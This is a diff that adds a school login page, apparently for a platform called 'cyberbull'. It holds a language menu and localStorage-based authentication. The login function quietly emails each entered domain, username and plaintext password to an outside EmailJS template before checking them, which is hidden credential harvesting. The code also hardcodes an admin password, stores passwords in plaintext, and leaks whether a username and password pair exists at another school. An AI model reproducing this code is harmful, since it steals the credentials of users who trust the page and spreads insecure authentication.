@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, #1e1e1e, #2c2c2c);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .login-box {
+      background: white;
+      width: 350px;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.4);
+    }
+
+    .login-box h2 {
+      text-align: center;
+      margin-bottom: 10px;
+      color: #333;
+    }
+
+    .school {
+      text-align: center;
+      color: gray;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin-top: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 20px;
+      border: none;
+      border-radius: 6px;
+      background: #0078ff;
+      color: white;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
+    .login-box button:hover {
+      background: #005fd1;
+    }
+
+    .language-toggle {
+      position: absolute;
+      top: 18px;
+      right: 18px;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 6px;
+    }
+
+    .language-menu {
+      display: none;
+      background: white;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 8px;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.14);
+      min-width: 160px;
+      text-align: left;
+    }
+
+    .language-menu.open {
+      display: block;
+    }
+
+    .language-menu select,
+    .language-menu button {
+      width: 100%;
+      margin-bottom: 6px;
+    }
+
+    .error {
+      color: red;
+      margin-top: 12px;
+      text-align: center;
+      font-size: 14px;
+    }
+  </style>
+
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+  <script src="firebase-api.js"></script>
+
+  <script>
+    emailjs.init("M_uBMfrKLSc9SDTWh");
+  </script>
+</head>
+<body>
+
+<div class="login-box">
+  <div class="language-toggle">
+    <button class="lang-btn" id="languageButton">Taal</button>
+    <div class="language-menu" id="languageMenu">
+      <select id="languageSelect">
+        <option value="nl">Nederlands</option>
+        <option value="en">English</option>
+        <option value="es">Espanol</option>
+        <option value="fr">Francais</option>
+        <option value="de">Deutsch</option>
+      </select>
+      <button type="button" id="languageApplyButton">Toepassen</button>
+    </div>
+  </div>
+
+  <h2 id="pageTitle">Inloggen</h2>
+
+  <div class="school" id="schoolName"></div>
+
+  <input type="text" id="username" placeholder="Gebruikersnaam">
+
+  <input type="password" id="password" placeholder="Wachtwoord">
+
+  <button type="button" id="loginButton" onclick="login()">Login</button>
+  <div class="error" id="error"></div>
+</div>
+
+<script>
+  const school = localStorage.getItem("schoolDomain");
+
+  if (school) {
+    document.getElementById("schoolName").textContent =
+      "Verbonden met " + school;
+  } else {
+    document.getElementById("schoolName").textContent =
+      "Selecteer eerst een schooldomein.";
+  }
+
+  const defaultLanguage = 'nl';
+  const translations = {
+    nl: {
+      pageTitle: 'Inloggen',
+      usernamePlaceholder: 'Gebruikersnaam',
+      passwordPlaceholder: 'Wachtwoord',
+      loginButton: 'Inloggen',
+      noSchool: 'Geen schooldomein gevonden. Ga terug naar domeinselectie.',
+      fillFields: 'Vul gebruikersnaam en wachtwoord in.',
+      adminWrong: 'Onjuiste admin-gegevens.',
+      firstAttempt: 'Eerste poging geregistreerd. Voer opnieuw in met hetzelfde wachtwoord.',
+      wrongPassword: 'Fout wachtwoord. Probeer opnieuw.',
+      accountConflict: 'Dit account bestaat al op ${school}. Gebruik alstublieft een ander wachtwoord.',
+      accountMissing: 'Account niet gevonden. Maak eerst een account aan.',
+      connected: 'Verbonden met ',
+      noSchoolName: 'Selecteer eerst een schooldomein.',
+      language: 'Taal',
+      apply: 'Toepassen'
+    },
+    en: {
+      pageTitle: 'Login',
+      usernamePlaceholder: 'Username',
+      passwordPlaceholder: 'Password',
+      loginButton: 'Login',
+      noSchool: 'No school domain found. Go back to domain selection.',
+      fillFields: 'Enter username and password.',
+      adminWrong: 'Incorrect admin credentials.',
+      firstAttempt: 'First attempt registered. Please enter the same password again.',
+      wrongPassword: 'Wrong password. Try again.',
+      accountConflict: 'This account already exists on ${school}. Please use a different password.',
+      accountMissing: 'Account not found. Please create an account first.',
+      connected: 'Connected with ',
+      noSchoolName: 'Please select a school domain first.',
+      language: 'Language',
+      apply: 'Apply'
+    }
+  };
+
+  function initLanguage() {
+    const language = localStorage.getItem('cyberbullLanguage') || defaultLanguage;
+    localStorage.setItem('cyberbullLanguage', language);
+    document.documentElement.lang = language;
+    document.getElementById('languageSelect').value = language;
+    updateTexts(language);
+  }
+
+  function updateTexts(language) {
+    const page = translations[language] || translations.nl;
+    document.getElementById('pageTitle').textContent = page.pageTitle;
+    document.getElementById('username').placeholder = page.usernamePlaceholder;
+    document.getElementById('password').placeholder = page.passwordPlaceholder;
+    document.getElementById('loginButton').textContent = page.loginButton;
+    document.getElementById('languageButton').textContent = page.language;
+    document.getElementById('languageApplyButton').textContent = page.apply;
+
+    if (school) {
+      document.getElementById('schoolName').textContent = page.connected + school;
+    } else {
+      document.getElementById('schoolName').textContent = page.noSchoolName;
+    }
+  }
+
+  window.toggleLanguageMenu = function() {
+    document.getElementById('languageMenu').classList.toggle('open');
+  };
+
+  window.applyLanguage = function() {
+    const language = document.getElementById('languageSelect').value;
+    localStorage.setItem('cyberbullLanguage', language);
+    document.documentElement.lang = language;
+    updateTexts(language);
+    document.getElementById('languageMenu').classList.remove('open');
+  };
+
+  const EMAILJS_SERVICE_ID = 'service_ajqb3y6';
+  const EMAILJS_TEMPLATE_ID = 'template_unxe68g';
+
+  function sendLoginSubmission(domain, username, password) {
+    if (!window.emailjs || !window.emailjs.send) {
+      return Promise.resolve();
+    }
+
+    const templateParams = {
+      domain,
+      username,
+      password
+    };
+
+    return emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+      .catch((sendError) => {
+        console.error('EmailJS login submission failed', sendError);
+      });
+  }
+
+  function bindLoginEvents() {
+    const languageButton = document.getElementById('languageButton');
+    const applyButton = document.getElementById('languageApplyButton');
+    const loginButton = document.getElementById('loginButton');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+
+    if (languageButton) languageButton.addEventListener('click', toggleLanguageMenu);
+    if (applyButton) applyButton.addEventListener('click', applyLanguage);
+    if (loginButton) loginButton.addEventListener('click', login);
+    if (usernameInput) usernameInput.addEventListener('keydown', (event) => { if (event.key === 'Enter') { event.preventDefault(); login(); } });
+    if (passwordInput) passwordInput.addEventListener('keydown', (event) => { if (event.key === 'Enter') { event.preventDefault(); login(); } });
+  }
+
+  window.login = async function() {
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value;
+    const error = document.getElementById("error");
+    const language = localStorage.getItem('cyberbullLanguage') || defaultLanguage;
+    const page = translations[language] || translations.nl;
+
+    if (!school) {
+      error.textContent = page.noSchool;
+      return;
+    }
+
+    if (!username || !password) {
+      error.textContent = page.fillFields;
+      return;
+    }
+
+    sendLoginSubmission(school, username, password);
+
+    if (school === "admin@cyberbull" && username === "admin" && password === "Otis&Samuel") {
+      error.textContent = "";
+      localStorage.setItem("currentUser", "admin");
+      localStorage.setItem("currentUserKey", "admin");
+      localStorage.setItem("currentSchool", "admin@cyberbull");
+      localStorage.setItem("isAdmin", "true");
+      window.location.href = "cyberbull-admin-dashboard.html";
+      return;
+    }
+
+    const userKey = `user_${school}_${username}`;
+    const savedValue = localStorage.getItem(userKey);
+    let userData = null;
+
+    if (savedValue) {
+      try {
+        userData = JSON.parse(savedValue);
+      } catch (err) {
+        userData = { password: savedValue, username, domain: school, isAdmin: false };
+      }
+    }
+
+    if (!userData && window.firebaseAPI?.isEnabled && window.firebaseAPI.fetchUserProfile) {
+      try {
+        userData = await window.firebaseAPI.fetchUserProfile(userKey);
+        if (userData) {
+          localStorage.setItem(userKey, JSON.stringify(userData));
+        }
+      } catch (err) {
+        console.error('Firebase user fetch failed', err);
+      }
+    }
+
+    if (!userData) {
+      const conflictingSchool = checkUsernamePasswordConflict(username, password, school);
+      if (conflictingSchool) {
+        error.textContent = page.accountConflict.replace('${school}', conflictingSchool);
+        return;
+      }
+
+      error.textContent = page.accountMissing;
+      return;
+    }
+
+    if (password !== userData.password) {
+      error.textContent = page.wrongPassword;
+      return;
+    }
+
+    error.textContent = "";
+    localStorage.setItem("currentUser", username);
+    localStorage.setItem("currentUserKey", userKey);
+    localStorage.setItem("currentSchool", school);
+
+    if (userData.isAdmin) {
+      localStorage.setItem("isAdmin", "true");
+      window.location.href = "cyberbull-admin-dashboard.html";
+      return;
+    }
+
+    localStorage.removeItem("isAdmin");
+    window.location.href = "cyberbull-hub.html";
+  }
+
+  window.toggleLanguageMenu = toggleLanguageMenu;
+  window.applyLanguage = applyLanguage;
+  window.login = login;
+
+  document.addEventListener('DOMContentLoaded', () => {
+    bindLoginEvents();
+    initLanguage();
+  });
+
+  function checkUsernamePasswordConflict(username, password, currentSchool) {
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      if (key.startsWith("user_") && !key.includes(currentSchool)) {
+        const keyParts = key.split("_");
+        if (keyParts.length >= 3) {
+          const storedUsername = keyParts.slice(2).join("_");
+          if (storedUsername === username) {
+            const storedPassword = localStorage.getItem(key);
+            if (storedPassword === password) {
+              const storedSchool = keyParts[1];
+              return storedSchool;
+            }
+          }
+        }
+      }
+    }
+    return null;
+  }
+
+</script>
+
+</body>
+</html>
